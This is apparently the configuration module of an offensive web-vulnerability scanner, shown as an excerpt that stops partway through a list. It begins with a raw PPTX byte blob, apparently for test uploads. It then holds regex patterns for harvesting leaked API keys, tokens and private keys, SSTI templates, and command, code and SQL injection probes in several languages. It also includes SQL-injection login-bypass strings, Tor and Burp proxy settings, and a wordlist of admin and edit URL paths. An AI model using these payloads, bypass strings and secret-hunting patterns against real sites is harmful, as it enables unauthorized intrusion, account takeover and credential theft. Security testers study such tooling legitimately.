\xac\xd9^\'\xcf\x84\x91\xbb\xab`\x9f/\xa51\xb2\xbdJ\xfe LhF\xe8\xe3U\xfa\x829\xb9\xef\xff\xc0\xdf{\x9dz=jK\xfd\xe5O{\x1d\xd5\x0b\xe8]\xbe\xa6K\xf4\xbf\xe6W`\xbf\xef\xec\x1b\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00p+\x1cke\x01\x00\x00\x87\x02\x00\x00\x11\x00\x08\x01docProps/core.xml \xa2\x04\x01(\xa0\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x92\xddn\x820\x18\x86\xcf\x97\xec\x1eH\xcf\xa1\x05\'s\r`\xb2\x1f\x8ft\x92\x8c\xfddgM\xf9\xd4fPH\xdb\x89^\xd2\xaec7\xb6\xc2\x1453;l\xde\xa7O\xde\xefk\xa3\xf1\xa6,\x9c5(-*\x19#\xdf#\xc8\x01\xc9\xab\\\xc8e\x8c\x9e\xb3\x89;B\x8e6L\xe6\xac\xa8$\xc4h\x0b\x1a\x8d\x93\xcb\x8b\x88\xd7\x94W\nRU\xd5\xa0\x8c\x00\xedX\x93\xd4\x94\xd71Z\x19SS\x8c5_A\xc9\xb4g\ti\xc3E\xa5Jf\xecQ-q\xcd\xf8\x07[\x02\x0e\x08\tq\t\x86\xe5\xcc0\xdc\n\xdd\xba7\xa2\x9d2\xe7\xbd\xb2\xfeTE\'\xc89\x86\x02J\x90Fc\xdf\xf3\xf1\x815\xa0J}\xf6B\x97\x1c\x91\xa50\xdb\x1a\xce\xa2\xfb\xb0\xa77Z\xf4`\xd34^3\xe8P\xdb\xdf\xc7o\xb3\xe9S7\xaa+d\xbb+\x0e(\x89rN\x8d0\x05$\xa9\xfa\xfe\xd2\xb6\'3v\xc5NZ5\xa0\xd2JH\x13\xe1\x1ei\x97Y0mfv\xef\x0b\x01\xf9\xed6\x99><\xce_\xe6\x11\xfe\x9b\xb4\xb0\x82\xb5h_,\xf1;\xa2?F\xbb\xf1)W\xc0\x0c\xe4\x8e\xadM\x7f\x87\xdc\'\xaf\x83\xbb\xfbl\x82\x92\x80\xf8C\x97\x84.\x19f\x84P?\xa4$|o+\x9d\xdc?\x08\xcb]\x81\x7f\x8d\xc1\xc0%#7\x082\xff\x8a\x067\x94\\\x1f\x19\xf7\x82\xa4k|\xfau\x92\x1f\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00I\x83\x1e\xdb\x13\x02\x00\x00\xf1\x04\x00\x00\x10\x00\x08\x01docProps/app.xml \xa2\x04\x01(\xa0\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4T\xcdn\xdb0\x0c\xbe\x0f\xd8;\x18\xba7N\xb6!\x18\x02\xc5\xc5\x90\xa2\xc8aY\r\xc4\xed\xce\xaaE\xc7\xc4dI\x90T\xaf\xdd\x13\xad\xcf\x91\x17\x1b-\'\xae\xd3\x15;\x0cm\x80\x00\x1f\x7fL\x7f$?\x9a\x9f\xdf7*i\xc1y4z\xc9f\x93)K@\x97F\xa2\xde-\xd9uqy\xf6\x99%>\x08-\x852\x1a\x96\xec\x01<;\xcf\xde\xbf\xe3\xb93\x16\\@\xf0\t\x95\xd0~\xc9\xea\x10\xec"M}YC#\xfc\x84\xc2\x9a"\x95q\x8d\x08d\xba]j\xaa\nK\xb80\xe5]\x03:\xa4\x1f\xa6\xd3y\n\xf7\x01\xb4\x04yf\x87\x82\xac\xaf\xb8h\xc3\xff\x16\x95\xa6\xec\xf8\xf9\x9b\xe2\xc1R\xbd\x8c\x17\xd0X%\x02d<}\x82\x85\tB\x15\xd8@6%\xf7`\xf0\xef\xc6I\xdf\xf9z\xc0\xbfX\xab\xb0\x14\x81F\x94m\xb0t\xc6\x9b*$W\xf1\xbdIn~\x82\xcb\r\xea\xc0\xd3q"\r\x08<\x11\x8a\xd6e\xe4\x9b\xe54g\xa3\xb5P\xe8\xf7\x8f<}!\x83\xe7\xc2\x89\x9d\x13\xb6\x8e\x04F\x16\xdf*\x94\xe0\xb3\x19O\x0f\x88\x7f3\x01bZ\x0f\xf8\x1a\xa5\x04}\x88\x92\xfb\xc4\xe6\x9b\xcdJ\xa1\x8d\x81#\xe4\xdbR(X\xd1\xa4\xb2J(\x0fTzp\xf05\x88N\x05\xb9@G\x99mX\xb4P\x06\xe3\x12\x8f\xbfH\x07s\x96\xdc\n\x0f\xdd|\x97\xac\x15\x0e\x85\x0e\xacO\xeb\x8d\x88\x95\xf5\xc1e\xb9\xa1\xa9\x90N\xee\x02\xc6\xce\xc1\xf3t\x08F8~f\x8c\xf1S\xd7o\x0f\xfe\x99\xd8\xd7*\xea\xfd\xef\x06\xde\xaa8\x06\xdaW"\xbb?\nk<\x06l_\xa3\x95h\xc4\xd9\x12>\x9d:\xbdS\x81\xbf\xaaH\x07\xe1\x85%|\x1c/!r\xe8W\xd0\xd3Y\x91\xcen\x1d\x8e\t\x0e\xe8 \xde\x82\xae\xead^O;s\xfb\xc7A\x9c\'"\x7f\xd6\xee\x91\xf83\xaa_Q\xff\xf0\xd7\xb60\x17\xdd\xa9\x1d\xd4u\xea\xe4\xdbZ8\x90t\xb9\x83\xfa\x06\x07_SONu\xf9\xabZ\xe8\x1d\xc8c\xce\xdf\x81\xee>o\xfa/X6\x9bO\xa6\xf4\x8b\xa7x\xf4u\x87v\xfc\xb4d\x7f\x00\x00\x00\xff\xff\x03\x00PK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x82\xa4\x81\xf9\x8c\x01\x00\x00\x98\x08\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[Content_Types].xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xf3k\xd1\x85\xf1\x00\x00\x00Q\x02\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x03\x00\x00_rels/.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd5.\x01\xc6\x02\x00\x00\x00\x0e\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe7\x06\x00\x00ppt/presentation.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\x8cOM*\x01\x00\x00N\x02\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdf\t\x00\x00ppt/slides/slide1.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x1b.5\x07\x0c\x01\x00\x00\xd0\x03\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<\x0b\x00\x00ppt/_rels/presentation.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00<\xc2%\xdd\xc0\x00\x00\x007\x01\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8d\r\x00\x00ppt/slides/_rels/slide1.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00^\xab\xe0S\x86\x05\x00\x00\x0b\x1d\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8b\x0e\x00\x00ppt/slideMasters/slideMaster1.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00E-\xb6\xdaz\x03\x00\x00R\x0c\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x14\x00\x00ppt/slideLayouts/slideLayout1.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00$\x16\xd7\xae\xfc\x02\x00\x00\xef\n\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x18\x00\x00ppt/slideLayouts/slideLayout2.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xa1\x8b\xe6\x1df\x03\x00\x00\x82\r\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x1b\x00\x00ppt/slideLayouts/slideLayout3.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xdcV\xffb\xe6\x02\x00\x00\xaa\t\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe9\x1e\x00\x00ppt/slideLayouts/slideLayout4.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xefi\xb08\xcf\x02\x00\x00n\x08\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e"\x00\x00ppt/slideLayouts/slideLayout5.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x96g\xc7\x18\xf0\x00\x00\x00&\x04\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c%\x00\x00ppt/slideMasters/_rels/slideMaster1.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00V&\x00\x00ppt/slideLayouts/_rels/slideLayout1.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\'\x00\x00ppt/slideLayouts/_rels/slideLayout2.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00b(\x00\x00ppt/slideLayouts/_rels/slideLayout3.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00h)\x00\x00ppt/slideLayouts/_rels/slideLayout4.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00n*\x00\x00ppt/slideLayouts/_rels/slideLayout5.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xf9\xcf\t9\xe3\x05\x00\x00\\\x1b\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t+\x00\x00ppt/theme/theme1.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00h$\xd1\xc8\x1d\x02\x00\x00\x03\x05\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x891\x00\x00ppt/presProps.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x008\xb7\x8b\xd6x\x01\x00\x00@\x03\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd53\x00\x00ppt/viewProps.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xb2\x11\x19\xa6\x87\x01\x00\x00\x07\x03\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|5\x00\x00ppt/tableStyles.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00p+\x1cke\x01\x00\x00\x87\x02\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0047\x00\x00docProps/core.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00I\x83\x1e\xdb\x13\x02\x00\x00\xf1\x04\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd09\x00\x00docProps/app.xmlPK\x05\x06\x00\x00\x00\x00\x18\x00\x18\x00\x0e\x07\x00\x00\x19=\x00\x00\x00\x00'
    }

    json_configs_signatures=['apikey:"','apikey: "','apikey="','apikey= "','apikey = "',
                            'api_key:"''api_key: "''api_key="','api_key ="','api_key = "',
                            'authorization:"','app_key','react_app','amazonaws.com',
                            '"EAACEdEose0cBA','"bearer ','_token:"','accesstoken:"','appid:"','s3.console.aws.amazon.com/s3/buckets/',
                            ':"AIza',':"AAAA',':"ya29',':"6L',':"sq0csp-',':"sqOatp-',
                            ':"sk_live_',':"rk_live_']

    js_exposed_secrets_regexs={
        'json_configs':r'{[^{}]*}',
        'google_api'     : r'AIza[0-9A-Za-z-_]{35}',
        'firebase'  : r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
        'firebase_config':r'{apiKey:"(.*?)",authDomain:"(.*?)",projectId:"(.*?)",storageBucket:"(.*?)",messagingSenderId:"(.*?)",appId:"(.*?)",measurementId:"(.*?)",vapidKey:"(.*?)"}',
        'google_captcha' : r'6L[0-9A-Za-z-_]{38}|^6[0-9a-zA-Z_-]{39}$',
        'google_oauth'   : r'ya29\.[0-9A-Za-z\-_]+',
        "slack_token": "(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
        "slack_webhook": "https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
        "facebook_oauth": "[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\"\\s][0-9a-f]{32}['\"\\s]",
        "twitter_oauth": "[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]",
        "picatic_api": "sk_live_[0-9a-z]{32}",
        "google_oauth_id": "[0-9(+-[0-9A-Za-z_]{32}.apps.qooqleusercontent.com",'amazon_aws_access_key_id' : r'A[SK]IA[0-9A-Z]{16}',
        'amazon_mws_auth_token' : r'amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        'amazon_aws_url' : r's3\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\.s3\.amazonaws.com',
        'amazon_aws_url2' : r"(" \
            r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com" \
            r"|s3://[a-zA-Z0-9-\.\_]+" \
            r"|s3-[a-zA-Z0-9-\.\_\/]+" \
            r"|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+" \
            r"|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)",
        'facebook_access_token' : r'EAACEdEose0cBA[0-9A-Za-z]+',
        'authorization_basic' : (r'basic [a-zA-Z0-9=:_\+\/-]{5,100}',),
        'authorization_bearer' : (r'bearer [a-zA-Z0-9_\-\.=:_\+\/]{5,100}',),
        'authorization_api' : (r'api[key|_key|\s+]+[a-zA-Z0-9_\-]{5,100}',),
        'mailgun_api_key' : r'key-[0-9a-zA-Z]{32}',
        'twilio_api_key' : r'SK[0-9a-fA-F]{32}',
        'twilio_account_sid' : r'AC[a-zA-Z0-9_\-]{32}',
        'twilio_app_sid' : r'AP[a-zA-Z0-9_\-]{32}',
        'paypal_braintree_access_token' : r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
        'square_oauth_secret' : r'sq0csp-[ 0-9A-Za-z\-_]{43}|sq0[a-z]{3}-[0-9A-Za-z\-_]{22,43}',
        'square_access_token' : r'sqOatp-[0-9A-Za-z\-_]{22}|EAAA[a-zA-Z0-9]{60}',
        #'stripe_public_api' : r'pk_live_[0-9a-zA-Z]{24}',
        'stripe_standard_api' : r'sk_live_[0-9a-zA-Z]{24}',
        'stripe_restricted_api' : r'rk_live_[0-9a-zA-Z]{24}',
        'github_access_token' : r'[a-zA-Z0-9_-]*:[a-zA-Z0-9_\-]+@github\.com*',
        'rsa_private_key' : r'-----BEGIN RSA PRIVATE KEY-----',
        'ssh_dsa_private_key' : r'-----BEGIN DSA PRIVATE KEY-----',
        'ssh_dc_private_key' : r'-----BEGIN EC PRIVATE KEY-----',
        'pgp_private_block' : r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
        'json_web_token' : r'ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$',
        'slack_token' : r"\"api_token\":\"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\"",
        'SSH_privKey' : r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)",
        'Heroku API KEY' : r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
        "amazon_aws_access_key_id": "AKIA[0-9A-Z]{16}",
        "amazon_mws_auth_token": "amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        "amazonaws_url": "s3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com"
    #     'possible_Creds' : r"(?i)(" \
    #                     r"password\s*[`=:\"]+\s*[^\s]+|" \
    #                     r"password is\s*[`=:\"]*\s*[^\s]+|" \
    #                     r"pwd\s*[`=:\"]*\s*[^\s]+|" \
    #                     r"passwd\s*[`=:\"]+\s*[^\s]+)",
    # 
    }

    ssti_list=["{{payload}}","{payload}","@(payload)","${payload}","#{payload}","${{payload}}","#{{payload}}","<%= payload %>","#{set} ($run= payload ) $run","#set ($run= payload ) $run "]


    rce_payloads={
            "command": {
                "linux": {
                    "file": ["touch {}.txt", "`touch {}.txt`", "$(touch {}.txt)"],
                    "time": ["sleep {}", "`sleep {}`", "$(sleep {})"],
                },
                "windows": {"file": ["copy nul {}.txt"], "time": ["ping -n {} 127.0.0.1"]},
            },
            "code": {
                "python": {
                    "file": [" open('{}.txt', 'w') "],
                    "time": [" __import__('time').sleep({}) "],
                },
                "php": {
                    "file": [" file_put_contents('{}.txt', '') "],
                    "time": [" sleep({}) "],
                },
                "ruby": {"file": [' File.new("{}.txt", "w") '], "time": [" sleep({}) "]},
                "perl": {
                    "file": [' open ( my $fh, ">", "{}.txt") '],
                    "time": [" sleep({}) "],
                },
                "js": {
                    "file": [" require('fs').createWriteStream('{}.txt', {flags: 'w'})  "],
                    "time": [
                        " (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) ",
                        " await (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) ",
                    ],
                },
            },
            "sql": {
                "mysql": {"time": [" sleep({}) "]},
                "oracle": {"time": [" dbms_lock.sleep({}) "]},
                "postgre": {"time": [" pg_sleep({}) "]},
                "sql_server": {"time": [" WAITFOR DELAY '00:00:{}' "]},
            },
        }

    default_tor_socks5_proxy_linux={'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

    default_tor_socks5_proxy_windows={'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}

    default_tor_http_proxy={'http': 'http://127.0.0.1:8118', 'https': 'http://127.0.0.1:8118'}

    default_burpsuit_http_proxy={
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }

    burpsuit_proxy_host="127.0.0.1"

    burpsuit_proxy_port=8080

    burpsuit_http_proxy={
        "http": "http://{}:{}",
        "https": "http://{}:{}",
    }

    default_proxies_list=[]


    tor_proxy_host="127.0.0.1"

    tor_proxy_socks5_port_windows=9150

    tor_proxy_socks5_port_linux=9050

    tor_proxy_http_port=8118

    tor_socks5_proxy={'http': 'socks5h://{}:{}', 'https': 'socks5h://{}:{}'}

    tor_http_proxy={'http': 'http://{}:{}', 'https': 'http://{}:{}'}


    statuscodes={
    "100": "Continue",
    "101": "Switching Protocols",
    "102": "Processing",
    "200": "OK",
    "201": "Created",
    "202": "Accepted",
    "203": "Non-Authoritative Information",
    "204": "No Content",
    "205": "Reset Content",
    "206": "Partial Content",
    "207": "Multi-Status",
    "208": "Already Reported",
    "226": "IM Used",
    "300": "Multiple Choices",
    "301": "Moved Permanently",
    "302": "Found",
    "303": "See Other",
    "304": "Not Modified",
    "305": "Use Proxy",
    "307": "Temporary Redirect",
    "308": "Permanent Redirect",
    "400": "Bad Request",
    "401": "Unauthorized",
    "402": "Payment Required",
    "403": "Forbidden",
    "404": "Not Found",
    "405": "Method Not Allowed",
    "406": "Not Acceptable",
    "407": "Proxy Authentication Required",
    "408": "Request Timeout",
    "409": "Conflict",
    "410": "Gone",
    "411": "Length Required",
    "412": "Precondition Failed",
    "413": "Request Entity Too Large",
    "414": "Request-URI Too Long",
    "415": "Unsupported Media Type",
    "416": "Requested Range Not Satisfiable",
    "417": "Expectation Failed",
    "418": "I'm a teapot",
    "420": "Enhance Your Calm",
    "422": "Unprocessable Entity",
    "423": "Locked",
    "424": "Failed Dependency",
    "425": "Reserved for WebDAV",
    "426": "Upgrade Required",
    "428": "Precondition Required",
    "429": "Too Many Requests",
    "431": "Request Header Fields Too Large",
    "444": "No Response",
    "449": "Retry With (Microsoft)",
    "450": "Blocked by Windows Parental Controls (Microsoft)",
    "451": "Unavailable For Legal Reasons",
    "499": "Client Closed Request",
    "500": "Internal Server Error",
    "501": "Not Implemented",
    "502": "Bad Gateway",
    "503": "Service Unavailable",
    "504": "Gateway Timeout",
    "505": "HTTP Version Not Supported",
    "506": "Variant Also Negotiates",
    "507":"Insufficient Storage",
    "508": "Loop Detected",
    "509": "Bandwidth Limit Exceeded",
    "510": "Not Extended",
    "511":"Network Authentication Required",
    "598": "Network read timeout error",
    "599":"Network connect timeout error"
    }
    sqli_payloads=[
    "or 1=1'",
    'or 1=1',
    'or 1=1--',
    'or 1=1#',
    'or 1=1/*',
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    'admin" --',
    'admin" #',
    'admin"/*',
    'admin" or "1"="1',
    'admin" or "1"="1"--',
    'admin" or "1"="1"#',
    'admin" or "1"="1"/*',
    'admin"or 1=1 or ""="',
    'admin" or 1=1',
    'admin" or 1=1--',
    'admin" or 1=1#',
    'admin" or 1=1/*',
    'admin") or ("1"="1',
    'admin") or ("1"="1"--',
    'admin") or ("1"="1"#',
    'admin") or ("1"="1"/*',
    'admin") or "1"="1',
    'admin") or "1"="1"--',
    'admin") or "1"="1"#',
    'admin") or "1"="1"/*',
    '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055'
    ]
    inner_urls_list=[
    '/products',
    '/editproduct',
    '/addproduct',
    '/edit_product',
    '/add_product',
    '/add-product',
    '/edit-product',
    '/editproducts',
    '/addproducts',
    '/edit_products',
    '/add_products',
    '/add-products',
    '/edit-products',
    '/images',
    '/addimage',
    '/add_image',
    '/editimage',
    '/edit_image',
    '/edit-image',
    '/add-image',
    '/addimages',
    '/add_images',
    '/editimages',
    '/edit_images',
    '/edit-images',
    '/add-images',
    '/manageimages',
    '/managemembers',
    '/managegames',
    '/games',
    '/addgame',
    '/add_game',
    '/add-game',
    '/editgame',
    '/edit_game',
    '/edit-game',
    '/addgames',
    '/add_games',
    '/add-games',
    '/editgames',
    '/edit_games',
    '/edit-games',
    '/staffs',
    '/addstaff',
    '/add_staff',
    '/add-staff',
    '/editstaff',
    '/edit_staff',
    '/edit-staff',
    '/addstaffs',
    '/add_staffs',
    '/add-staffs',
    '/editstaffs',
    '/edit_staffs',
    '/edit-staffs',
    '/employees',
    '/addemployee',
    '/add_employee',
    '/add-employee',
    '/editemployee',
    '/edit_employee',
    '/edit-employee',
    '/editemployees',
    '/addemployees',
    '/add_employees',
    '/add-employees',
    '/editemployees',
    '/edit_employees',
    '/edit-employees',
    '/edit',
    '/add',
    '/home',
    '/members',
    '/addmember',
    '/add_member',
    '/add-member',
    '/editmember',
    '/edit_member',
    '/edit-member',
    '/editmembers',
    '/addmembers',
    '/add_members',
    '/add-members',
    '/editmembers',
    '/edit_members',
    '/edit-members',
    '/admin',
    '/dashboard',
    '/acceuil',
    '/setting',
    '/options',
    '/users',
    '/adduser',
    '/edituser',
    '/add_user',
    '/add-user',
    '/edit_user',
    '/edit-user',
    '/addusers',
    '/editusers',
    '/add_users',
    '/add-users',
    '/edit_users',
    '/edit-users',
    '/pages',
    '/addpage',
    '/add_page',
    '/add-page',
    '/editpage',
    '/edit_page',
    '/edit-page',
    '/editpages',
    '/addpages',
    '/add_pages',
    '/add-pages',
    '/editpages',
    '/edit_pages',
    '/edit-pages',
    '/news',
    '/editnews',
    '/addnews',
    '/edit_news',
    '/edit-news',
    '/add_news',
    '/add-news',
    '/events',
    '/editevent',
    '/addevent',
    '/edit_event',
    '/add_event',
    '/edit-event',
    '/add-event',
    '/editevents',
    '/addevents',
    '/edit_events',
    '/add_events',
    '/edit-events',
    '/add-events',
    '/categories',
    '/editcategory',
    '/addcategory',
    '/edit-category',
    '/add-category',
    '/edit_category',
    '/add_category',
    '/cat',
    '/editcat',
    '/addcat',
    '/edit_cat',
    '/add_cat',
    '/edit-cat',
    '/add-cat',
    '/subcategories',
    '/editsubcategory',
    '/addsubcategory',
    '/edit-subcategory',
    '/add-subcategory',
    '/edit_subcategory',
    '/add_subcategory',
    '/solutions',
    '/addsolution',
    '/editsolution',
    '/edit_solution',
    '/edit-solution',
    '/add-solution',
    '/add_solution',
    '/addsolutions',
    '/editsolutions',
    '/edit_solutions',
    '/edit-solutions',
    '/add-solutions',
    '/add_solutions',
    '/addsolutions',
    '/postjobs',
    '/editpostjob',
    '/edit_postjob',
    '/edit-postjob',
    '/addpostjob',
    '/add-postjob',
    '/add_postjob',
